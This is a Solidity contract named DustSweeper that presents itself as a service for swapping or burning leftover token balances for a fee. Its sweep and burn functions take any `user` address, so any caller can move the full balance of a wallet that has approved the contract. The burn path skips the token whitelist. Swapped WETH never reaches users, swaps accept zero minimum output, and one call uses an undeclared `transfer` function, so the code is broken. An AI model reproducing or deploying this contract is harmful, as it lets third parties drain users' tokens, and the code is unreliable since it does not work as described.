// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256 amountOut);
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

contract DustSweeper {
    address public owner;
    address public feeRecipient;
    uint256 public feePercent = 15; // 15% for swaps
    uint256 public burnFee = 0.0004 ether; // $1 for burns
    IUniswapV3Router public uniswapRouter = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    address public constant burnAddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) public trustedTokens;

    constructor(address _feeRecipient) {
        owner = msg.sender;
        feeRecipient = _feeRecipient;
        // Whitelist: Stablecoins, major tokens, legit meme coins
        trustedTokens[0xdAC17F958D2ee523a2206206994597C13D831ec7] = true; // USDT
        trustedTokens[0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48] = true; // USDC
        trustedTokens[0x6B175474E89094C44Da98b954EedeAC495271d0F] = true; // DAI
        trustedTokens[0x514910771AF9Ca656af840dff83E8264EcF986CA] = true; // LINK
        trustedTokens[0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984] = true; // UNI
        trustedTokens[0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE] = true; // SHIB
        trustedTokens[0xB8c77482e45F1F44dE1745F52C74426C631bDD52] = true; // DOGE
        trustedTokens[0xB90B2A35C65f8f462b908CFFB9eDaaCc1B4568b2] = true; // FLOKI
        trustedTokens[0x6982508145454Ce325dDbE47a25d4ec3d2311933] = true; // PEPE
        trustedTokens[0x111111111117dC0aa78b770fA6A738034120C302] = true; // 1INCH
    }

    function addTrustedToken(address token) external {
        require(msg.sender == owner, "Only owner");
        trustedTokens[token] = true;
    }

    function sweepTokens(
        address[] calldata tokens,
        address user,
        uint256[] calldata permitValues,
        uint256[] calldata deadlines,
        uint8[] calldata v,
        bytes32[] calldata r,
        bytes32[] calldata s
    ) external {
        require(tokens.length <= 50, "Max 50 tokens");
        require(tokens.length == permitValues.length, "Invalid permit data");
        bytes[] memory calls = new bytes[](tokens.length);
        uint256 callIndex = 0;

        for (uint i = 0; i < tokens.length; i++) {
            require(trustedTokens[tokens[i]], "Untrusted token");
            IERC20 token = IERC20(tokens[i]);
            uint256 balance = token.balanceOf(user);
            if (balance > 0) {
                if (permitValues[i] > 0) {
                    try token.permit(user, address(this), balance, deadlines[i], v[i], r[i], s[i]) {
                        // Permit successful
                    } catch {
                        token.transferFrom(user, address(this), balance);
                        token.approve(address(uniswapRouter), balance);
                    }
                } else {
                    token.transferFrom(user, address(this), balance);
                    token.approve(address(uniswapRouter), balance);
                }

                calls[callIndex] = abi.encodeWithSelector(
                    uniswapRouter.exactInputSingle.selector,
                    IUniswapV3Router.ExactInputSingleParams({
                        tokenIn: tokens[i],
                        tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
                        fee: 3000,
                        recipient: address(this),
                        deadline: block.timestamp + 1800,
                        amountIn: balance,
                        amountOutMinimum: 0, // Frontend checks value
                        sqrtPriceLimitX96: 0
                    })
                );
                callIndex++;
            }
        }

        if (callIndex > 0) {
            bytes[] memory swapCalls = new bytes[](callIndex);
            for (uint i = 0; i < callIndex; i++) {
                swapCalls[i] = calls[i];
            }
            uniswapRouter.multicall(swapCalls);
        }

        uint256 totalBalance = address(this).balance;
        uint256 fee = (totalBalance * feePercent) / 100;
        uint256 userAmount = totalBalance - fee;

        payable(user).transfer(userAmount);
        payable(feeRecipient).transfer(fee);
    }

    function burnTokens(
        address[] calldata tokens,
        address user,
        uint256[] calldata permitValues,
        uint256[] calldata deadlines,
        uint8[] calldata v,
        bytes32[] calldata r,
        bytes32[] calldata s
    ) external payable {
        require(tokens.length <= 50, "Max 50 tokens");
        require(msg.value >= burnFee, "Insufficient burn fee");
        require(tokens.length == permitValues.length, "Invalid permit data");

        for (uint i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 balance = token.balanceOf(user);
            if (balance > 0) {
                if (permitValues[i] > 0) {
                    try token.permit(user, address(this), balance, deadlines[i], v[i], r[i], s[i]) {
                        // Permit successful
                    } catch {
                        token.transferFrom(user, address(this), balance);
                    }
                } else {
                    token.transferFrom(user, address(this), balance);
                }
                token.transfer(burnAddress, balance);
            }
        }

        payable(feeRecipient).transfer(msg.value);
    }

    receive() external payable {}
}
